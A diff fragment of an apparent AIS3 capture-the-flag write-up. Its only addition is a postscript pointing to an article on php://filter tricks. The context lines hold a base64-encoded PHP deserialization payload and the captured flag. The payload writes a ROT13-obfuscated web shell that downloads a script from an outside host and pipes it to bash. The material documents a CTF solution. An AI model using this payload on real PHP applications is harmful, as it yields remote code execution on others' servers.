@@ -127,3 +127,5 @@ Payload:
 `TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6MTc6InNldHRpbmdfc2F2ZV9wYXRoIjtzOjUxOiJwaHA6Ly9maWx0ZXIvd3JpdGU9c3RyaW5nLnJvdDEzL3Jlc291cmNlPXNoZWxsMy5waHAiO3M6MTc6IgBVc2VyUHJvZmlsZQBkYXRhIjthOjI6e3M6MzoiaGF0IjtzOjE6ImEiO3M6NDoiaGF0MiI7czo0NjoiPD9jdWMgZmxmZ3J6KCdwaGV5IHhudm9lYi5nai9ufG9uZnUnKTs/Pnhudm9lYiI7fX0=`
 
 `AIS3{Conquer_The_World}`
+
+p.s. phithon有篇文章就是在說明這種利用方式: https://www.leavesongs.com/PENETRATION/php-filter-magic.html
